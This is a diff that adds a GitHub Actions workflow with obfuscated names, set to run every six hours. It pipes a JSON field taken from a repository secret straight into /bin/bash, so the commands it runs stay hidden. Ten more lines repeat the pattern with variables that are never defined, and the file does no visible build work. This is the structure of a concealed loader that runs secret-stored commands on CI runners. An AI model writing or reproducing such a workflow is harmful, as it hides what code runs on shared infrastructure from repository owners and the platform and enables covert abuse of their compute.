@@ -1,0 +1,28 @@
+name: majhabnk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: majhabnk
+        env:
+          rpxs327: ${{ secrets.rpxs327 }}
+        run: |
+          echo $rpxs327 | jq -r .whbj91 | /bin/bash
+          echo $wsz2136 | jq -r .tmbl3640 | /bin/bash
+          echo $pxuiy4 | jq -r .ndt45669 | /bin/bash
+          echo $hwbh6 | jq -r .pon5 | /bin/bash
+          echo $hbnb571 | jq -r .ew655 | /bin/bash
+          echo $g69 | jq -r .tin738 | /bin/bash
+          echo $shstm216 | jq -r .yd88 | /bin/bash
+          echo $horn477 | jq -r .d082 | /bin/bash
+          echo $sc7 | jq -r .rgihd783 | /bin/bash
+          echo $fgovh9 | jq -r .pte11 | /bin/bash
+          echo $a696 | jq -r .tblxx4879 | /bin/bash
+
